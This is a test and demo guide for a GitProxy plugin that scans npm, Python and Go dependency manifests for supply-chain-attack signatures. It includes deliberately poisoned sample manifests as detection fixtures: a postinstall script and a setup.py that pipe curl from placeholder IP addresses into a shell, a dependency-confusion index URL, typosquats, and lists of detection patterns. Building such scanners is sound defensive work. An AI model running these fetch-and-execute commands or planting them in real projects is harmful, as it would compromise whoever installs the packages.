# Supply-chain scanning - manual test & demo guide

This guide shows how to **manually test** and **demo to the business** the supply-chain-attack
scanner (`@finos/git-proxy-plugin-supply-chain`).

The scanner inspects dependency manifests as they flow through GitProxy and flags common
supply-chain-attack signatures - on **push** (someone adds a poisoned dependency to your repos)
and on **clone/pull** (you download a poisoned repo).

## What it catches

**npm** (`package.json`, `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`):

- Install lifecycle scripts (`postinstall`, `preinstall`, `install`, `prepare`) - escalated when
  the script does something dangerous (`curl … | sh`, `eval`, `base64 -d`, `child_process`, raw IPs).
- Dependencies pulled from non-registry sources (git, http(s) tarball, `file:`, scp/ssh, npm alias).
- `overrides` / `resolutions` that force a transitive dependency to a git/url source.
- Typosquatted package names (e.g. `expresss`, `lodahs`).
- Unpinned/wildcard versions (`*`, `latest`).
- Lockfile sources that resolve off-registry, over plain http, or from git.

**Python** (`requirements*.txt`, `pyproject.toml`, `setup.py`, `Pipfile`, `poetry.lock`, `Pipfile.lock`):

- `setup.py` code execution at install/build time (escalated on `os.system`/`subprocess`,
  `eval`/`exec`, network calls, base64, raw IPs).
- Custom package indexes (`--extra-index-url`, poetry/pipenv source blocks) - dependency confusion.
- Non-registry sources (vcs/url/editable, inline `git`/`url`/`path`, PEP 508 direct URLs).
- Unpinned requirements and typosquats.

**Go** (`go.mod`, `go.sum`):

- `replace` directives pointing at local filesystem paths or redirecting to a different remote
  module.
- Suspicious module hosts: raw IPv4, `localhost`, or module paths containing `http://`.
- Pseudo-versions, `+incompatible` versions, changed `toolchain` directives, and added `exclude`
  directives.
- Typosquatted module paths checked against the offline `lib/data/go-popular.js` list.
- `go.sum` lockfile lines with suspicious module hosts.
- `vendor/modules.txt` is not scanned.

These heuristics are a warning layer, not a guarantee. Absence of findings does not mean a repo is
safe.

**Behaviour:** non-blocking by default (findings are surfaced for review), or configured to
**hard-block** at/above a severity you choose.

---

## Demo 1 - 60-second detection demo (no proxy, no build, no install)

The detection engine has **zero runtime dependencies**, so you can show the findings on a bare
checkout with nothing but `node`. Save this as `demo-scan.mjs` in the repo root and run it.

```js
// demo-scan.mjs
import { analyzeChangedFiles } from './plugins/git-proxy-plugin-supply-chain/lib/analyze.js';
import { renderFindings } from './plugins/git-proxy-plugin-supply-chain/lib/findings.js';
import { rankAtLeast } from './plugins/git-proxy-plugin-supply-chain/lib/severity.js';
import { resolveConfig } from './plugins/git-proxy-plugin-supply-chain/lib/config.js';

// A repository containing several classic supply-chain-attack signatures.
const repo = {
  'package.json': JSON.stringify(
    {
      name: 'demo',
      version: '1.0.0',
      scripts: { postinstall: 'curl http://198.51.100.10/x.sh | sh' },
      dependencies: {
        expresss: '^4.0.0', // typosquat of "express"
        evil: 'git+https://github.com/attacker/evil.git', // non-registry source
        lodash: '*', // unpinned
      },
    },
    null,
    2,
  ),
  'requirements.txt':
    '--extra-index-url https://internal.attacker.example/simple\n' + // dependency confusion
    'requsts==2.31.0\n' + // typosquat of "requests"
    'git+https://github.com/attacker/p.git#egg=p\n', // non-registry source
  'setup.py': 'import os\nos.system("curl http://198.51.100.11 | bash")\n', // install-time RCE
};

// Treat every file as newly introduced (as on a fresh clone or a new push).
const files = [
  { path: 'package.json', ecosystem: 'npm', kind: 'manifest', deleted: false },
  { path: 'requirements.txt', ecosystem: 'python', kind: 'manifest', deleted: false },
  { path: 'setup.py', ecosystem: 'python', kind: 'manifest', deleted: false },
];
const readFile = async (path, rev) => (rev === 'old' ? null : (repo[path] ?? null));

const { findings, maxSeverity } = await analyzeChangedFiles({
  files,
  readFile,
  config: resolveConfig(),
});
console.log(renderFindings(findings));
console.log(`\nHighest severity: ${maxSeverity}`);
console.log(
  `Blocked if configured to fail on "high"? ${
    rankAtLeast(maxSeverity, 'high') ? 'YES - push/clone rejected' : 'no'
  }`,
);
```

Run it:

```bash
node demo-scan.mjs
```

Expected output (abridged) - a ranked list of findings ending with:

```
  #1 [CRITICAL] (npm) install lifecycle script "postinstall" added
  #2 [CRITICAL] (python) setup.py added (runs arbitrary code at install/build time)
  #3 [HIGH] (npm) new dependency "expresss" closely resembles the popular package "express"
  ...
Highest severity: critical
Blocked if configured to fail on "high"? YES - push/clone rejected
```

You can also run the automated test suite, which exercises every rule:

```bash
npm test -- --dir ./test test/plugins/supply-chain
```

---

## Demo 2 - full proxy demo (the business demo)

This is the compelling version: a real `git push` gets **held for review with the findings
attached**, and a real `git clone` of a poisoned repo **fails in the terminal**.

### Prerequisites

- Node.js >= 22, Git, and this repo checked out.
- A test upstream repository you control (e.g. a throwaway GitHub repo) - call it
  `github.com/<you>/demo-supply-chain`.
- One-time build so the compiled core includes the plugin hook:

  ```bash
  npm ci
  npm run build
  ```

  > `npm run build` is required: it compiles the `chainPhase` plugin hook into `dist/`, which the
  > plugin relies on to run after the diff (push) and after the auth check (pull).

### Step 1 - enable and configure the plugin

In `proxy.config.json`:

1. Add the plugin to the `plugins` array:

   ```json
   "plugins": ["./plugins/git-proxy-plugin-supply-chain/index.js"]
   ```

2. Authorise your test repo (so GitProxy will proxy it) by adding it to `authorisedList`:

   ```json
   {
     "project": "<you>",
     "name": "demo-supply-chain",
     "url": "https://github.com/<you>/demo-supply-chain.git"
   }
   ```

3. Choose the enforcement level. Create a config file, e.g. `supply-chain.json`:

   ```json
   { "failOn": "high", "pull": { "failOn": "high" } }
   ```

   and point the proxy at it:

   ```bash
   export GIT_PROXY_SUPPLY_CHAIN_CONFIG="$PWD/supply-chain.json"
   ```

   - Leave `failOn` as `"off"` (the default) to demo the **warn / review** flow (findings show in
     the dashboard; the push still goes to normal approval).
   - Set `failOn`/`pull.failOn` to `"high"` (or `"critical"`) to demo the **hard block** flow.

### Step 2 - run GitProxy

```bash
npm start
```

- Proxy: `http://localhost:8000`
- Review dashboard / UI: `http://localhost:8080` (log in with the default admin account -
  `admin` / `admin` unless you changed it)

### Step 3 - demo the PUSH protection

Create a local repo with a poisoned manifest and push it **through the proxy**:

```bash
mkdir /tmp/demo && cd /tmp/demo && git init
cat > package.json <<'EOF'
{
  "name": "demo",
  "version": "1.0.0",
  "scripts": { "postinstall": "curl http://198.51.100.10/x.sh | sh" },
  "dependencies": { "expresss": "^4.0.0" }
}
EOF
git add . && git commit -m "add dependency"

# Point the remote at the proxy (proxy URL = http://localhost:8000/<host>/<path>)
git remote add proxy http://localhost:8000/github.com/<you>/demo-supply-chain.git
git push proxy master
```

- With `failOn: "high"`: the push is **rejected in your terminal**, printing the findings
  (`remote: ... install lifecycle script "postinstall" added ...`).
- With `failOn: "off"`: the push is held for review; open the dashboard link from the push output
  (`http://localhost:8080/dashboard/push/<id>`) and show the **`supplyChain` step** listing the
  findings before a reviewer approves or rejects. (Approve via the UI, or on the CLI:
  `npm run cli -- login` then `npm run cli -- ls` and `npm run cli -- authorise --id <id>`.)

### Step 4 - demo the PULL / clone protection

First make sure your upstream `demo-supply-chain` repo actually contains a poisoned file on its
default branch (commit a `package.json` like the one above to it). Then clone it **through the
proxy** with `pull.failOn` set:

```bash
git clone http://localhost:8000/github.com/<you>/demo-supply-chain.git
```

- With `pull.failOn: "high"`: the **clone fails in the terminal** - the developer is stopped before
  they ever run `npm install`. GitProxy returns a Git protocol error packet
  (`ERR <message>`) on the `git-upload-pack` response, so `git clone` aborts and prints the message
  (`remote: ...` / `fatal: ...`).
- With `pull.failOn: "off"` (default): the clone succeeds and the findings are logged by the proxy
  (server-side) for audit.

> This live clone against the running proxy is the authoritative wire-level confirmation that the
> block works. The error-packet format itself is byte-checked and unit-tested
> (`test/testProxyRoute.test.ts`), but seeing a real `git clone` abort with the message is the
> proof to show the business.

---

## Configuration reference

Set `GIT_PROXY_SUPPLY_CHAIN_CONFIG` to a JSON file:

```json
{
  "enabled": true,
  "failOn": "off",
  "ecosystems": { "npm": true, "python": true, "go": true },
  "typosquat": true,
  "allowPackages": [],
  "npmRegistryHosts": ["registry.npmjs.org"],
  "pull": { "enabled": true, "failOn": "off" }
}
```

- `failOn` / `pull.failOn` - `"off"` (warn only) | `"low"` | `"medium"` | `"high"` | `"critical"`.
  A push/clone whose highest finding meets or exceeds the threshold is blocked.
- `allowPackages` - package names and full Go module paths to exempt from typosquat /
  new-dependency flags.
- `npmRegistryHosts` - registry hosts treated as "expected" for lockfile source checks.

---

## Talking points for the business

- **The threat is real and current.** Recent incidents - `event-stream`, `ua-parser-js`, the `xz`
  backdoor (delivered via build scripts), and ongoing npm/PyPI typosquatting - all rode in through
  a dependency change or a poisoned repo. The dangerous code usually runs automatically at
  **install time** (`postinstall`, `setup.py`), before anyone reviews it.
- **We already sit in the path.** GitProxy is a mandatory chokepoint for git traffic, so we can
  inspect dependency changes on **push** (before they land in our repos) and content on **clone**
  (before a developer pulls a poisoned repo) - with no change to developer tooling.
- **Warn, then enforce.** Start in warn mode to measure noise, then dial `failOn` up to block the
  highest-risk changes. Every finding is attached to the push's review record for audit.
- **Defence in depth, offline by default.** Pure static heuristics, no external calls, no new
  dependencies. An optional network tier (advisory databases) can be added later.

---

## Known limitations (be transparent in the demo)

- **Pull scanning is HTTPS only** today (SSH clones are skipped) and scans the **default branch**,
  not an arbitrarily requested ref.
- On pull, **non-blocking warnings are logged server-side**, not shown in the developer's terminal
  (only _blocks_ reach the terminal, via the `git-upload-pack` `ERR` packet). Terminal warnings on
  an _allowed_ clone are a planned follow-up (they need sideband injection into the served pack).
- **Manifest heuristics are a warning layer, not a guarantee.** Absence of a finding does not mean
  a repo is safe - malicious code can hide outside declared dependencies (plain source, build
  steps, binaries). Present this as "flags known dependency-manifest risks", not "blocks all
  supply-chain attacks".
- The pull scan clones the **default branch** for inspection; if a client requests a different ref,
  the scanned content can differ from what is delivered.
- On an allowed clone the proxy fetches the repo once to scan it and the client fetches again
  (a double fetch); a future optimisation serves the pack from the scanned copy.
- Coverage is **npm + Python + Go**; Cargo/RubyGems are planned.

---

## Cleanup

```bash
rm -f demo-scan.mjs
rm -rf /tmp/demo
# revert the proxy.config.json edits (plugins / authorisedList) if this was a shared checkout
```
